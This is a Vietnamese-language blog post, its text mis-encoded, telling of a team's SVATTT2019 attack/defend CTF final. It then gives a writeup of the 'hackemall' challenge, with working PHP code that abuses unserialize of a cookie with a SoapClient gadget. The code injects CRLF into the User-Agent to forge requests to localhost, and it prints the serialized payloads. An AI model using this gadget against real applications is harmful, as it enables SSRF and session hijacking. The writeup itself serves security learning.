---
layout: post-with-toc
title: "SVATTT2019 K·ªÉ chuy·ªán ƒëi thi v√† writeup hackemall"
h1: "SVATTT2019 K·ªÉ chuy·ªán ƒëi thi v√† writeup hackemall"
categories: CTF
tags: [SVATTT2019final, hackemall]
excerpt: "SVATTT2019 K·ªÉ chuy·ªán ƒëi thi v√† writeup hackemall"
post-thumb: nupakachi.jpg
comments: true
color-theme: "#052f6f"
js-files: ["post-with-toc"]
---

# Chuy·ªán ƒëi thi
Cu·ªôc thi c≈©ng ƒë√£ k·∫øt th√∫c ƒë∆∞·ª£c 2 ng√†y r·ªìi. Nay m√¨nh ng·ªìi g√µ m·∫•y d√≤ng coi nh∆∞ ƒë·ªÉ l∆∞u l·∫°i m·ªôt k·ªâ ni·ªám kh√° vui m√† c≈©ng kh√° ti·∫øc...  
Bu·ªïi s√°ng tr∆∞·ªõc khi thi m√¨nh ph·∫£i d·∫≠y s·ªõm ƒëi h·ªçc th·ªÉ d·ª•c r·ªìi m·ªõi ƒëi thi ƒë∆∞·ª£c :'( L√Ω do m√¨nh kh√¥ng th·ªÉ ngh·ªâ ƒë∆∞·ª£c l√† v√¨ tr∆∞·ªõc ƒë√≥ ƒë√£ ngh·ªâ qu√° nhi·ªÅu, ngh·ªâ th√™m bu·ªïi n·ªØa l√† l·∫°i ƒë∆∞·ª£c t·∫≠p th·ªÉ d·ª•c th√™m k√¨ n·ªØa :'( C∆° m√† h·ªçc xong ƒë·∫øn n∆°i thi th√¨ v·∫´n ƒë∆∞·ª£c ng·ªìi ngh·ªâ ng∆°i chu·∫©n b·ªã th√™m g·∫ßn 2 ti·∫øng n·ªØa cu·ªôc thi m·ªõi b·∫Øt ƒë·∫ßu üòå  
Cu·ªôc thi ƒë∆∞·ª£c t·ªï ch·ª©c theo h√¨nh th·ª©c attack/defend. ƒê√¢y l√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh v√†o ƒë∆∞·ª£c chung k·∫øt m·ªôt cu·ªôc thi onsite l·∫°i ch∆°i ki·ªÉu atk/def n√™n c≈©ng kh√° b·ª° ng·ª° v√† th√≠ch th√∫ :v C·ª• th·ªÉ c√°ch thi nh∆∞ th·∫ø n√†y:  
M·ªói ƒë·ªôi ƒë∆∞·ª£c BTC c·∫•p 1 con server ch·∫°y c√°c d·ªãch v·ª• gi·ªëng nh∆∞ ki·ªÉu 1 b√†i jeopardy v√† m·ªôt con proxy ƒë·ª©ng tr∆∞·ªõc con server, traffic ƒë·∫øn c√°c service s·∫Ω route qua con proxy. BTC kh√¥ng cho c√°c ƒë·ªôi control con server m√† cho quy·ªÅn root con proxy c·ªßa ƒë·ªôi. Nh∆∞ v·∫≠y theo m√¨nh th·∫•y c√°ch ti·∫øp c·∫≠n ƒë·ªÉ attack l√† kh√° gi·ªëng khi ch∆°i c√°c gi·∫£i CTF b√¨nh th∆∞·ªùng, n·∫øu b√†i cho source th√¨ s·∫Ω ƒë·ªÉ tr√™n scroreboard, c√≤n ƒë·ªÉ defend s·∫Ω d·ª±a v√†o vi·ªác monitor traffic qua con proxy ƒë·ªÉ filter, kh√¥ng ph·∫£i b·∫±ng c√°ch v√° l·ªói ch∆∞∆°ng tr√¨nh. ƒê√¢y l√† h√¨nh minh h·ªça c√°ch setup c·ªßa BTC:  

![Network.png](../assets/images/Network.png)

Theo nh∆∞ k·∫ø ho·∫°ch d·ª± ƒë·ªãnh th√¨ team m√¨nh s·∫Ω thay th·∫ø lu√¥n c√°i c∆° ch·∫ø forward do BTC c√†i ƒë·∫∑t tr√™n proxy b·∫±ng c√°i [portforwarder](https://github.com/Q5Ca/simple-portforwarder) ƒë√£ code ·ªü nh√† ƒë·ªÉ c√≥ th·ªÉ monitor c≈©ng nh∆∞ control traffic t·ªët h∆°n. Th·∫ø nh∆∞ng m√¨nh v√† ng∆∞·ªùi a c√πng tem ƒë√£ m·∫Øc m·ªôt sai l·∫ßm ƒë√≥ l√† s·ª≠ d·ª•ng l·ªánh `iptables -L` ƒë·ªÉ t√¨m rule forward c·ªßa BTC, v√† c·∫£ bu·ªïi ƒë√£ kh√¥ng t√¨m th·∫•y ƒë·ªÉ t·∫Øt n√≥ ƒëi :'( Nguy√™n nh√¢n th√¨ ƒë·∫øn sau khi thi m·ªôt ng∆∞·ªùi anh ·ªü UET n√≥i m√¨nh m·ªõi bi·∫øt, l√† do c√°i rule ƒë√≥ n·∫±m ·ªü chain PREROUTING v√† d√πng -L kh√¥ng n√≥ ch·ªâ list chain INPUT. Tr∆∞·ªõc ƒë√≥ m√¨nh ƒë√£ th·ª≠ forward traffic b·∫±ng iptables m·ªôt l·∫ßn r·ªìi, c√°ch ƒë·∫∑t rule c≈©ng y nh∆∞ v·∫≠y m√† su·ªët th·ªùi gian thi l·∫°i qu√™n m·∫•t.  

![shame-on-me](../assets/images/shame-on-me.jpg)  

Ngo√†i chuy·ªán ƒë√≥ ra th√¨ qu√° tr√¨nh thi c·ªßa team m√¨nh di·ªÖn ra nh∆∞ sau: Sau khi cu·ªôc thi b·∫Øt ƒë·∫ßu m·ªôt kho·∫£ng th·ªùi gian th√¨ th·∫±ng b·∫°n c√πng team b·∫£o n√≥ c√≥ h∆∞·ªõng b√†i crypto v√† ƒë√£ ra ƒëo·∫°n SVATTT trong flag, sau ƒë√≥ m·ªôt kho·∫£ng th·ªùi gian n·ªØa th√¨ n√≥ ra ƒë∆∞·ª£c full flag th·∫≠t. V√† ƒë√≥ c≈©ng l√† b√†i gi√∫p team m√¨nh ghi ph·∫ßn l·ªõn s·ªë ƒëi·ªÉm trong cu·ªôc thi. C√≥ th·ªÉ n√≥i thanh ni√™n l·∫°i m·ªôt l·∫ßn n·ªØa gank tem üôè  
M·ªôt v√†i round ƒë·∫ßu sau khi ra b√†i ƒë√≥ th√¨ team m√¨nh ch·ªâ attack v√† submit flag ƒë∆∞·ª£c m·ªôt s·ªë team do code tool t·ª± ƒë·ªông b·ªã l·ªói, 2 thanh ni√™n trong team ng·ªìi exploit b·∫±ng tay v√† copy paste ƒë·ªÉ submit flag. Sau khi fix ƒë∆∞·ª£c l·ªói th√¨ tool t·ª± ƒë·ªông ch·∫°y kh√° ngon (m·ªôt s·ªë flag l·∫•y ƒë∆∞·ª£c nh∆∞ng submit l·∫°i kh√¥ng ƒë∆∞·ª£c, h√¨nh nh∆∞ l√† do l√∫c ƒë√≥ l√† round m·ªõi v√† con bot ƒë·ªïi flag ch∆∞a ƒë·ªïi xong). Team m√¨nh d·∫ßn v∆∞∆°n l√™n top 2 v√†o t·∫ßm bu·ªïi tr∆∞a. Sau ƒë√≥ th√¨ c·ª© m·ªói round m·ªõi team m√¨nh l·∫°i ch·∫°y tool auto attack 2 3 l·∫ßn v√† b√°m tr·ª• ƒë∆∞·ª£c trong top 2 m·ªôt th·ªùi gian kh√° l√¢u. B√™n c·∫°nh ƒë√≥ team m√¨nh c√≤n th·ªãt ƒë∆∞·ª£c 2 b√†i jeo, ƒÉn ƒë∆∞·ª£c th√™m 40000 ƒëi·ªÉm n·ªØa.  
Nh·ªØng t∆∞·ªüng t√¨nh h√¨nh s·∫Ω ti·∫øp t·ª•c kh·∫£ quan th√¨ ƒë·∫øn giai ƒëo·∫°n cu·ªëi cu·ªôc thi, sai l·∫ßm k·ªÉ l√∫c tr∆∞·ªõc b·∫Øt ƒë·∫ßu b·ªôc ph√°t t√°c h·∫°i. Team m√¨nh kh√¥ng ch·∫∑n ƒë∆∞·ª£c c√°c ƒë·ª£t t·∫•n c√¥ng l·∫°i m·∫•t kh√° nhi·ªÅu th·ªùi gian ƒë·ªÉ build l·∫°i payload do c√°c ƒë·ªôi kh√°c attack c·ªông v·ªõi service c·ªßa team m√¨nh th·ªânh tho·∫£ng l·∫°i ngho·∫ªo m√† m√¨nh kh√¥ng bi·∫øt l√Ω do t·∫°i sao. K·∫øt qu·∫£ team m√¨nh c·ª© d·∫ßn tr√¥i xu·ªëng trong s·ª± bu·ªìn ƒëau v√† b·∫•t l·ª±c kh√¥ng bi·∫øt ph·∫£i l√†m g√¨ üò≠ v√† k·∫øt th√∫c ·ªü v·ªã tr√≠ th·ª© 6 tr√™n scoreboard attack defend. C·ªông v·ªõi ƒëi·ªÉm ph·∫ßn jeopardy n·ªØa th√¨ chung cu·ªôc team m√¨nh ƒë·ª©ng th·ª© 4.  
V·ªÅ ph·∫ßn web th√¨ trong cu·ªôc thi c√≥ m·ªôt b√†i 1 b√†i d·∫°ng atk/def v√† 2 b√†i d·∫°ng jeopardy. L√∫c b·∫Øt ƒë·∫ßu m√¨nh lao v√†o l√†m b√†i atk/def, ƒëo√°n h∆∞·ªõng c·ªßa n√≥ l√† race condition nh∆∞ng bu·ªïi s√°ng ng·ªìi race m√£i l·∫°i k ƒë∆∞·ª£c. (Updated: sau khi ƒë·ªçc [writeup](https://github.com/vinhjaxt/CTF-writeups/issues/1) c·ªßa a @vinhjaxt th√¨ h√≥a ra kh√¥ng race ƒë∆∞·ª£c l√† do chall b·ªã config sai üò¢ ) ƒê·∫øn tr∆∞a th√¨ b√†i n√†y ƒë√≥ng l·∫°i n√™n m√¨nh quay ra ng·ªìi l√†m jeopardy. Nh∆∞ng l√∫c ƒë√≥ th·∫≠t s·ª± l√† kh√¥ng t·∫≠p trung n·ªïi v√¨ c√°i v·∫•n ƒë·ªÅ monitor v·∫´n ch∆∞a ƒë∆∞·ª£c gi·∫£i quy·∫øt, c√≥ l√∫c team m√¨nh c√≤n t∆∞·ªüng l√† d√πng ssh tunnel ƒë·ªÉ forward @@ ƒê·∫øn l√∫c ƒÉn tr∆∞a xong th√¨ th·∫•y team v·∫´n gi·ªØ ƒë∆∞·ª£c v·ªã tr√≠ kh√° ·ªïn n√™n m√¨nh t·∫°m g√°c v·∫•n ƒë·ªÅ ƒë·∫•y l·∫°i v√† t·∫≠p trung xem b√†i hackemall v√† ƒë√£ gi·∫£i ƒë∆∞·ª£c. Sau khi gi·∫£i ƒë∆∞·ª£c t√¢m tr·∫°ng m√¨nh l√∫c ƒë√≥ kh√° l√† vui. Sau ƒë√≥ m·ªôt th·ªùi gian ng·∫Øn th√¨ c√°c ƒë·ªôi ƒë√£ gi·∫£i ƒë∆∞·ª£c b√†i `HelloVietNam` v√† ƒë·∫≠p nhau lo·∫°n x·∫°, team m√¨nh b·ªã ƒë·∫≠p kh√° m·∫°nh. M√¨nh c√≥ b·∫Øt ƒë∆∞·ª£c payload nh∆∞ng l·∫°i m·∫•t kh√° nhi·ªÅu th·ªùi gian ƒë·ªÉ ph√¢n t√≠ch v√† ƒë·∫øn nh·ªØng ph√∫t cu·ªëi c·ªßa cu·ªôc thi m·ªõi build l·∫°i th√†nh c√¥ng v√† ch·ªâ k·ªãp attack ƒë∆∞·ª£c m·ªói m·ªôt ƒë·ªôi.  
D√π sao th√¨ ƒë√¢y c≈©ng l√† m·ªôt k·ªâ ni·ªám ƒë√°ng nh·ªõ v·ªõi c·∫£ team, c√≥ th·ªÉ coi l√† ƒë·ªông l·ª±c ƒë·ªÉ b·ªçn m√¨nh ti·∫øp t·ª•c s·ªëng v√† l√†m vi·ªác v·ªõi ƒëam m√™. Thay m·∫∑t c·∫£ team (m·∫∑c d√π m√¨nh kh√¥ng ph·∫£i leader), m√¨nh, em xin g·ª≠i l·ªùi c·∫£m ∆°n ch√¢n th√†nh ƒë·∫øn BTC v√¨ m·ªôt cu·ªôc thi b·ªï √≠ch v√† nh·ªØng challenge th√∫ v·ªã. GGWP everyones üíñ 

# writeup b√†i hackemall
T√≥m t·∫Øt s∆° qua b√†i n√†y l√† v·ªÅ kƒ© thu·∫≠t ƒë·ªÉ SSRF qua unserialize. ƒêi·ªÉm ƒë·∫∑c bi·ªát l√† ta s·∫Ω s·ª≠ d·ª•ng m·ªôt class c√≥ s·∫µn trong PHP (c·∫ßn c√†i th√™m extension) ch·ª© kh√¥ng ph·∫£i trong code c·ªßa ·ª©ng d·ª•ng. Khi m√¨nh vi·∫øt writeup n√†y th√¨ server ƒë√£ ƒë√≥ng r·ªìi, n√™n m√¨nh ƒë√£ xin [source](../archives/SVATTT2019-final/nanana.zip) t·ª´ t√°c gi·∫£ ƒë·ªÉ d·ª±ng l·∫°i (pass: tsu1234).  
Khi ti·∫øp c·∫≠n b√†i n√†y th√¨ theo kinh nghi·ªám, vi·ªác ƒë·∫ßu ti√™n m√¨nh l√†m l√† d·∫°o m·ªôt v√≤ng qua ·ª©ng d·ª•ng, d√πng th·ª≠ c√°c ch·ª©c nƒÉng c·ªßa n√≥ ƒë·ªÉ xem c√≥ j b·∫•t th∆∞·ªùng kh√¥ng. ƒê√£ t·ª´ng c√≥ b√†i ctf c√≥ cho source v√† m√¨nh ƒë√£ t√¨m ra bug lu√¥n khi blackbox, n·∫øu ng·ªìi ƒë·ªçc c·∫£ m·ªõ code c·ªßa n√≥ th√¨ ch·∫Øc s·∫Ω m·∫•t nhi·ªÅu th·ªùi gian h∆°n ƒë·ªÉ t√¨m ra üòõ  
V·ªÅ b√†i `hackemall` n√†y th√¨ c∆° b·∫£n c√≥ c√°c ch·ª©c nƒÉng ch√≠nh ƒë·ªÉ ta c√≥ th·ªÉ b·∫Øt pokemon v·ªõi m·ªôt x√°c su·∫•t b·∫Øt th√†nh c√¥ng n√†o ƒë√≥.  

![77.PNG](../assets/images/77.PNG)  

Sau khi ngh·ªãch m·ªôt l√∫c th√¨ m√¨nh check trong burp v√† ph√°t hi·ªán ra c√°i cookie kh·∫£ nghi c√≥ d·∫°ng object serialize. ƒê·∫øn ƒë√¢y th√¨ m√¨nh ƒëo√°n ch·∫Øc r·∫±ng b√†i n√†y s·∫Ω li√™n quan ƒë·∫øn deserialize r·ªìi :v  

![78.PNG](../assets/images/78.PNG)   

Sau ƒë√≥ m√¨nh th·ª≠ b·∫Øt m·ªôt v√†i l·∫ßn b·∫±ng c√°ch ·∫•n `USE POKE BALL` th√¨ th·∫•y bung ra source code. üòô    

![79.PNG](../assets/images/79.PNG)  

ƒê·ªçc source th√¨ m√¨nh nh·∫≠n th·∫•y ƒë·ªÉ l·∫•y flag th√¨ c·∫ßn d√πng ƒë·∫øn `master_ball`  
```php
  function use_master_ball()
  {
      $this->name = htmlentities($this->name);
      $pkm = htmlentities($_POST['pokemon']);
      if($_SESSION['master_ball']>0)
      {
        $_SESSION['master_ball']-=1;
        if($_POST['pokemon']==="Flag")
        {
          die('Captured Flag: '. $GLOBALS['flag']);
        }
        else
        {
          die($this->name. ' captured '.$pkm.'! Cool trainer!!!! Adventure <a href="index.php">more</a>');
        }
      }
      else
      {
        die('No Master Ball!!! Trainer '. $this->name. ' should take some ball <a href="get_more_ball.php">here</a>');
      }
  }
```
Nh∆∞ng ban ƒë·∫ßu th√¨ ta kh√¥ng c√≥ `master_ball` n√†o m√† ch·ªâ ƒë∆∞·ª£c cho 5 poke ball th√¥i :'(  
```php
if (!isset($_SESSION['poke_ball']) or !isset($_SESSION['master_ball']))
{
    $_SESSION['poke_ball'] = 5;
    $_SESSION['master_ball'] = 0;
}
```
ƒê·ªÉ l·∫•y ƒë∆∞·ª£c `master_ball` th√¨ sau khi m√¨nh d√πng h·∫øt `poke_ball` th√¨ th·∫•y link n√†y   

![80.PNG](../assets/images/80.PNG)  

![81.PNG](../assets/images/81.PNG)  

Nh∆∞ v·∫≠y ƒë·ªÉ l·∫•y `master_ball` th√¨ c·∫ßn pass ƒë∆∞·ª£c c√°i check `$_SERVER["REMOTE_ADDR"]==="127.0.0.1" or $_SERVER["REMOTE_ADDR"]==="::1"`. M√¨nh c√≥ th·ª≠ d√πng header `X-Forwarded-For` v√† m·ªôt kƒ© thu·∫≠t kh√°c kh√° m·ªõi l√† [Abusing HTTP hop-by-hop request headers](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers) nh∆∞ng kh√¥ng th√†nh c√¥ng. C≈©ng h·ª£p l√Ω m√† v√¨ n·∫øu th√†nh c√¥ng th√¨ h√≥a ra c√°i cookie kh·∫£ nghi kia l·∫°i kh√¥ng ƒë·ªÉ l√†m g√¨ √† :v  
Check trong code th√¨ m√¨nh th·∫•y c√°i cookie ƒë∆∞·ª£c unserialize th·∫≠t  

![82.PNG](../assets/images/82.PNG)  

C√≥ `unserialize` v√† c·∫ßn SSRF ü§î Do ƒë√£ t·ª´ng ƒë·ªçc trong slide [n√†y](https://2018.zeronights.ru/wp-content/uploads/materials/9%20ZN2018%20WV%20-%20PHP%20unserialize.pdf) n√™n m√¨nh nghƒ© ngay ƒë·∫øn gadget d√πng method `__call` c·ªßa `SoapClient`. ƒêi·ªÅu ki·ªán ƒë·ªÉ c√≥ th·ªÉ exploit ƒë∆∞·ª£c l√†:
- Server ph·∫£i c√†i extension soap th√¨ m·ªõi c√≥ class SoapClient
```
apt install php-soap
```
- ·ª®ng d·ª•ng ph·∫£i g·ªçi m·ªôt method c·ªßa object unserialize ra m√† c√°i method ƒë√≥ l·∫°i kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong SoapClient. C√°i n√†y v√¨ ta trigger b·∫±ng `__call` m√† ƒë·ªãnh nghƒ©a c·ªßa n√≥ nh∆∞ th·∫ø [n√†y](https://www.php.net/manual/en/language.oop5.overloading.php#object.call).  
> __call() is triggered when invoking inaccessible methods in an object context.  

ƒêi·ªÅu ki·ªán n√†y ƒë√£ ƒë∆∞·ª£c th·ªèa m√£n v√¨ trong code ta c√≥ th·ªÉ g·ªçi `use_poke_ball` qua ƒëo·∫°n n√†y  
```php
if(isset($_POST['poke_ball']) && isset($_POST['pokemon']) && !empty($_POST['pokemon']))
{
    $trainer->use_poke_ball();
}
```
M√¨nh google payload v√† tham kh·∫£o payload ·ªü [ƒë√¢y](https://xz.aliyun.com/t/6050) test th·ª≠
```php
<?php
$o = new SoapClient(null,array('location'=>'http://q5ca0.free.beeceptor.com/abc','uri'=>'cc'));
$o->lol();
```
L∆∞u √Ω ƒë·ªÉ build payload theo c√°ch n√†y th√¨ m√°y b·∫°n c≈©ng c√†i php-soap r·ªìi. Ch·∫Øc c√≥ th·ªÉ build ki·ªÉu khai b√°o m·ªõi class SoapClient nh∆∞ng m√¨nh ch∆∞a th·ª≠ :v Ch·∫°y th·ª≠ tr√™n local th√¨ m√¨nh x√°c nh·∫≠n c√≥ request g·ª≠i l√™n, serialize v√† urlencode l·∫°i r test tr√™n server xem:  
```php
echo urlencode(serialize($o));
//O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A2%3A%22cc%22%3Bs%3A8%3A%22location%22%3Bs%3A35%3A%22http%3A%2F%2Fq5ca0.free.beeceptor.com%2Fabc%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

![83.PNG](../assets/images/83.PNG)  

![84.PNG](../assets/images/84.PNG)  

Ngon r·ªìi c√≥ request, v·∫≠y l√† sure k√®o m√¨nh ƒëang ƒëi ƒë√∫ng h∆∞·ªõng. Nh∆∞ng ƒë·ªÉ SSRF ƒë∆∞·ª£c ƒë·ªÉ l·∫•y master_ball th√¨ c√≤n m·ªôt kh√≥ khƒÉn n√†y: Xem x√©t kƒ© reuqest d√πng SoapClient g·ª≠i l√™n th√¨ n√≥ tr√¥ng nh∆∞ sau  

![85.PNG](../assets/images/85.PNG)  

ƒê·ªÉ l·∫•y ƒë∆∞·ª£c master_ball th√¨ ta kh√¥ng ch·ªâ c·∫ßn control ƒë∆∞·ª£c data ƒë·ªÉ th√†nh `ball=master_ball` m√† c√≤n ph·∫£i s·ª≠a ƒë∆∞·ª£c `Content-Type` th√†nh `application/x-www-form-urlencoded` v√¨ hi·ªán gi·ªù n√≥ l√† `text/xml; charset=utf-8`, PHP s·∫Ω kh√¥ng cho data v√†o `$_POST`  
May m·∫Øn l√† ta c√≥ th·ªÉ inject CRLF v√†o request t·ª´ SoapClient. SoapClient c√≥ thu·ªôc t√≠nh `user_agent` ƒë·ªÉ ƒë·∫∑t gi√° tr·ªã c·ªßa header `User-Agent` trong request. V√† ta c√≥ th·ªÉ inject ƒë∆∞·ª£c v√†o nh∆∞ th·∫ø n√†y :v  
```php
<?php
$o = new SoapClient(null,array('location'=>'http://localhost:4444/abc','uri'=>'cc', 'user_agent' => "a\r\nanother: header"));
$o->lol();
```

![86.PNG](../assets/images/86.PNG)  

Header `User-Agent` l·∫°i ·ªü tr√™n `Content-Type` n√™n vi·ªác ghi ƒë√® l√† ho√†n to√†n c√≥ th·ªÉ :v  
T√≥m l·∫°i m√¨nh gen payload ƒë·ªÉ l·∫•y master_ball nh∆∞ sau: L∆∞u √Ω l√† do s·ªë `master_ball` l∆∞u trong `$_SESSION` n√™n c·∫ßn th√™m cookie `PHPSESSID` ƒë·ªÉ ƒë·ªãnh danh cho session ta mu·ªën l·∫•y `master_ball`
```php
<?php
$data = "ball=master_ball";
$o = new SoapClient(null,array('location'=>'http://localhost/ctf/svattt/get_more_ball.php','uri'=>'cc', 'user_agent' => "a\r\nCookie: PHPSESSID=a9pgltk0cp2h3tpat8p7pdvm66\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:".(string)strlen($data)."\r\n\r\n".$data."\r\n"));
// $o->lol();
echo urlencode(serialize($o));
// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A2%3A%22cc%22%3Bs%3A8%3A%22location%22%3Bs%3A45%3A%22http%3A%2F%2Flocalhost%2Fctf%2Fsvattt%2Fget_more_ball.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A137%3A%22a%0D%0ACookie%3A+PHPSESSID%3Da9pgltk0cp2h3tpat8p7pdvm66%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A16%0D%0A%0D%0Aball%3Dmaster_ball%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```
Submit l√™n v√† ƒë·ª£i m·ªôt l√∫c ...  

![87.PNG](../assets/images/87.PNG)  

Check l·∫°i v√† ta ƒë√£ c√≥ 1 master_ball üòç  

![88.PNG](../assets/images/88.PNG)  

L·∫•y flag th√¥i :v  

![89.PNG](../assets/images/89.PNG)  

B√™n c·∫°nh ƒë√≥ b·∫°n c≈©ng c√≥ th·ªÉ inject CRLF v√†o `uri` v√† t·∫°o m·ªôt request m·ªõi ƒë∆∞·ª£c sau request ban ƒë·∫ßu. Chi ti·∫øt c√°ch n√†y b·∫°n xem ·ªü [writeup](https://youtu.be/oTlXtBgDlSo) c·ªßa ch√≠nh t√°c gi·∫£ nh√© :D  
Th√∫ th·∫≠t m√¨nh c≈©ng ·∫•p ·ªß kƒ© thu·∫≠t kh√° l√¢u r·ªìi, h√¥m thi c√≥ b√†i n√†y m·ªõi dc √°p d·ª•ng th·ª±c t·∫ø :v Thanks t√°c gi·∫£ @tsug0d 